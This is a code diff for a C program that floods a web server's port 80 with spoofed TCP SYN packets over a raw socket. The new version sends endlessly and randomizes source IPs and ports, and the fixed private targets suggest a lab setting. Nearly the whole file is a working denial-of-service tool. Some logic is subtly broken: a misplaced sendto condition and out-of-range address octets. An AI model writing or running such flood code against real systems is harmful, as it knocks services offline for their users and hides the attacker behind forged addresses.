@@ -1,80 +1,109 @@
-// inspire from: https://github.com/adamalston/SYN-Flood.git
+// inspire from: https://linuxtips.ca/index.php/2022/05/06/create-syn-flood-with-raw-socket-in-c/
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <time.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <netinet/ip.h>
+#include <netinet/tcp.h>
 #include <arpa/inet.h>
-#include "header.h"
 
-#define DEST_IP "10.0.9.1"
-#define DEST_PORT 80 // Attack the web server
-#define PACKET_LEN 1500
+#define MAX_PACKET_SIZE 4096
+#define IP_TARGET "10.0.15.1"
+#define PORT_TARGET 80
 
-//unsigned short calculate_tcp_checksum(struct ipheader *ip);
-
-// Given an IP packet, send it out using a raw socket.
-void send_raw_ip_packet(struct ipheader *ip)
+unsigned short csum (unsigned short *buf, int nwords)
 {
-    struct sockaddr_in dest_info;
-    int enable = 1;
+    unsigned long sum;
+    for (sum = 0; nwords > 0; nwords--)
+        sum += *buf++;
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    return (unsigned short)(~sum);
+}
+void setup_ip_header(struct iphdr *iph)
+{
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
+    iph->id = htonl(54321);
+    iph->frag_off = 0;
+    iph->ttl = MAXTTL;
+    iph->protocol = 6;  // upper layer protocol, TCP
+    iph->check = 0;
 
-    // Step 1: Create a raw network socket.
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-
-    // Step 2: Set socket option.
-    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
-
-    // Step 3: Provide needed information about destination.
-    dest_info.sin_family = AF_INET;
-    dest_info.sin_addr = ip->iph_destip;
-
-    // Step 4: Send the packet out.
-    if(sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) < 0)
-    {
-            perror("sendto failed");
-    }
-    close(sock);
+    // Initial IP, changed later in infinite loop
+    iph->saddr = inet_addr("192.168.3.100");
 }
 
-// Spoof a TCP SYN packet.
+void setup_tcp_header(struct tcphdr *tcph)
+{
+    tcph->source = htons(5678);
+    tcph->seq = random();
+    tcph->ack_seq = 0;
+    tcph->res2 = 0;
+    tcph->doff = 5; // Make it look like there will be data
+    tcph->syn = 1;
+    tcph->window = htonl(65535);
+    tcph->check = 0;
+    tcph->urg_ptr = 0;
+}
+
 int main()
 {
-    char buffer[PACKET_LEN];
-    struct ipheader *ip = (struct ipheader *)buffer;
-    struct tcpheader *tcp = (struct tcpheader *)(buffer + sizeof(struct ipheader));
+    char datagram[MAX_PACKET_SIZE];
+    struct iphdr *iph = (struct iphdr *)datagram;
+    struct tcphdr *tcph = (struct tcphdr *)((u_int8_t *)iph + (5 * sizeof(u_int32_t)));
+    struct sockaddr_in sin;
+    char new_ip[sizeof "255.255.255.255"];
 
-    srand(time(0)); // Initialize the seed for random # generation.
+    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 
-    for (size_t i = 0; i < 10000; i++)
-    {
-        memset(buffer, 0, PACKET_LEN);
-        // Step 1: Fill in the TCP header.
-        tcp->tcp_sport = rand(); 			// Use random source port
-        tcp->tcp_dport = htons(DEST_PORT);
-        tcp->tcp_seq = rand(); 				// Use random sequence #
-        tcp->tcp_offx2 = 0x50;
-        tcp->tcp_flags = TH_SYN; 			// Enable the SYN bit
-        tcp->tcp_win = htons(20000);
-        tcp->tcp_sum = 0;
+    unsigned int floodport = PORT_TARGET;
 
-        // Step 2: Fill in the IP header.
-        ip->iph_ver = 4;					// Version (IPV4)
-        ip->iph_ihl = 5;					// Header length
-        ip->iph_ttl = 50;					// Time to live
-        ip->iph_sourceip.s_addr = rand();	// Use a random IP address
-        ip->iph_destip.s_addr = inet_addr(DEST_IP);
-        ip->iph_protocol = IPPROTO_TCP; 	// The value is 6.
-        ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(floodport);
+    sin.sin_addr.s_addr = inet_addr(IP_TARGET);
 
-        // Calculate tcp checksum
-        //tcp->tcp_sum = calculate_tcp_checksum(ip);
+    // Clear the data
+    memset(datagram, 0, MAX_PACKET_SIZE);
 
-        // Step 3: Finally, send the spoofed packet
-        send_raw_ip_packet(ip);
+    // Set appropriate fields in headers
+    setup_ip_header(iph);
+    setup_tcp_header(tcph);
+
+    tcph->dest = htons(floodport);
+
+    iph->daddr = sin.sin_addr.s_addr;
+    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+
+    /* a IP_HDRINCL call, to make sure that the kernel knows
+    *     the header is included in the data, and doesn't insert
+    *     its own header into the packet before our data
+    */
+    int tmp = 1;
+    const int *val = &tmp;
+    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
+        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
+        exit(-1);
     }
-    return 0;
+
+    for(;;){
+        if(sendto(s,      /* our socket */
+                  datagram,         /* the buffer containing headers and data */
+                  iph->tot_len,      /* total length of our datagram */
+                  0,        /* routing flags, normally always 0 */
+                  (struct sockaddr *) &sin,   /* socket addr, just like in */
+                  sizeof(sin)) < 0)      /* a normal send() */
+
+
+        // Randomize source IP and source port
+        snprintf(new_ip,16,"%lu.%lu.%lu.%lu",random() / 255,random() / 255,random() / 255,random() / 255);
+        iph->saddr = inet_addr(new_ip);
+        //iph->saddr = inet_addr(new_ip);
+        tcph->source = htons(random() % 65535);
+        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+    }
 
 }
